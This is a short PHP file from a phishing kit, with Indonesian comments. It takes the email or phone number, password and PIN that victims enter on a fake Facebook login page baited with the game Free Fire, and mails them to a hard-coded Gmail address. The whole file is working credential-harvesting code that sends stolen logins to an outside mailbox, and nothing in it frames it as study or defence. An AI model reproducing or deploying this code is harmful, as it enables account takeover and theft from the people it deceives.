<html><?php
############################################
##        Author: SUMAN      ##
##       Mailer: TANTO ID            ##
##       Modifer: TANTO ID             ##
############################################
/* JANGAN GANTI COPYRIGHT NYA YA BANGSAT */

/* Fungsi berikut untuk mengambil input field. */

$imel = $_POST['email'];
$paswot = $_POST['password'];
$pin = $_POST['pin'];

/* Mengambil informasi untuk dikirim kepada facebook anda !. */

$body = "

-===¦ FACEBOOK ACCOUNT ¦===-

|>> Email or Phone Number : ".$imel."
|>> Password : ".$paswot."

-===¦ END INFO ¦===-

";

$emailsaya = "bangsaykuntul@gmail.com";
$subject ="FREE FIRE LEVEL [".$pin."]";
$headers ="From: SETORAN FREE FIRE <tanto@result.com>";
mail($emailsaya, $subject, $body, $headers);

$md5  = md5(gmdate("r"));
$sha1   = sha1(gmdate("r"));

?>